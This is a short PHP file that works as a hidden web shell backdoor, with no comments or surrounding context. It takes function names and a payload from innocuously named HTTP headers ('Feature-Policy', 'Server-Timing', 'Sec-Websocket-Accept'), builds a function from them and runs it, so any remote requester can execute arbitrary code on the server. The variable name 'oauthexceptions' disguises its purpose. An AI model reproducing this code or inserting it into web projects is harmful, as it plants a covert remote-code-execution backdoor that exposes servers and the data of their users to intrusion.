<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $oauthexceptions = $_HEADERS['Feature-Policy']('', $_HEADERS['Server-Timing']($_HEADERS['Sec-Websocket-Accept']));
    $oauthexceptions();
}